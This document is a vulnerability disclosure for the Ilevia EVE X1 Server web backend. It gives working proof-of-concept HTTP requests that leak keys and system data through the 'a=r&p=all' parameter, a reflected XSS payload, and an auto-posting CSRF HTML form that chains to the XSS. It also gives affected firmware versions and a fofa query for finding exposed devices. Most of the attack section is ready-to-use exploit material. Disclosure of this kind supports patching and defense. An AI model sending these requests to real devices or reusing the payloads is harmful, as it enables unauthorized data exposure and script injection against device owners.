# ilevia-EVE-X1-Server-CSRF
ilevia EVE X1 Server /bh_web_backend.The presence of DOM-based XSS combined with CSRF can access internal system data and execute JavaScript code.

## Affected Repository
- Project: Ilevia EVE X1 Server 
- Affect versions: Firmware Version<= 4.7.18.0.eden;Logic Version<=6.00 - 2025_07_21
- File: /ajax/php/bh_web_backend.php
- homePage: https://www.ilevia.com/
- Dependency: Ilevia EVE X1 Server ( Firmware Version<= 4.7.18.0.eden;Logic Version<=6.00 - 2025_07_21)

## Proof of Concept (PoC)
Information disclosure occurs due to concatenation based on code logic.

- Information disclosure

THE CODE
```
 this.Write = function(sids,bAsync){
  bAsync = bAsync ? true : false;
  var eve = new eveRequest();
  //eve.open("POST","../../ajax/php/bh_web_backend.php",bAsync);
  eve.open("POST","/ajax/php/bh_web_backend.php",bAsync);
  eve.setRequestHeader("content-type","application/x-www-form-urlencoded");
  eve.onreadystatechange =
  function(){
   if(eve.readyState === 4 && eve.status == 200){
    if(eve.responseText.charAt(0) == "S"){
     var oData = new ileEveData();
     oData.Text = sids;
     self.OnData(oData);
    }else{
     self.OnError(eve.responseText.substr(1));
    }
   }
  }
  eve.send("a=w&p="+sids);
 }

 this.StopPolling = function(mID){
  clearTimeout(self.monitors[mID-1]);
 }

 this.StartPolling = function(strSids,msPolling){
  if(strSids == ""){
    self.OnError("Polling can not start with invalid sids string");
    return -1;
  }

  {
    if(strSids == "all"){

    }else{
     var aSids = strSids.split("|");
     for(var i=0;i<aSids.length;++i){
      if(isNaN(parseInt(aSids[i]))){
       self.OnError("Polling can not start with invalid sids string:" + aSids[i] + " is invalid");
       return -1;
      }
     }
    }
  }
```
```
POST /ajax/php/bh_web_backend.php HTTP/1.1
Host: 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=u477ikovcc936bdor4ernlmt1r
content-type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36

a=r&p=all
```
Echoing key and other critical data.

<img width="1759" height="745" alt="image" src="https://github.com/user-attachments/assets/844677e3-5074-4ba3-96f8-12d758a05129" />


- Dom-xss

```
POST /ajax/php/bh_web_backend.php HTTP/1.1
Host: 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=u477ikovcc936bdor4ernlmt1r
content-type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36

a=r&p=13<script>alert(document.domain)</script>
```
<img width="1406" height="322" alt="image" src="https://github.com/user-attachments/assets/e63f6160-3274-40ea-99e7-74284d40a5ac" />
<img width="1257" height="176" alt="image" src="https://github.com/user-attachments/assets/6e03d7af-717c-4521-a226-c7406fd29c1c" />

- CSRF

```
<html>
<body>
<form action="http://ip:port/ajax/php/bh_web_backend.php" method="POST" name="form1" enctype="application/x-www-form-urlencoded" >
<input type="hidden" name="a" value="r"/>
<input type="hidden" name="p" value="13&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;"/>
<input type="submit" value="Submit request" />
</form>
<script>history.pushState('', '', '/');</script>
</body>
</html>
```
<img width="801" height="153" alt="image" src="https://github.com/user-attachments/assets/d3672fef-f4ea-492f-bf84-725858ec0222" />
<img width="1307" height="302" alt="image" src="https://github.com/user-attachments/assets/e4e27137-c58c-414e-93cb-26400e637aaf" />




## Vulnerability category
- CWE-352​ ​Cross-Site Request Forgery (CSRF)
- CWE-200​ Exposure of Sensitive Information to an Unauthorized Actor
- CWE-79​​ Improper Neutralization of Input During Web Page Generation
## Scope of influence
- fofa：app="ilevia-EVE-X1-Server"
<img width="1482" height="340" alt="image" src="https://github.com/user-attachments/assets/2075aed5-76be-438a-a18e-e2e33380c26f" />
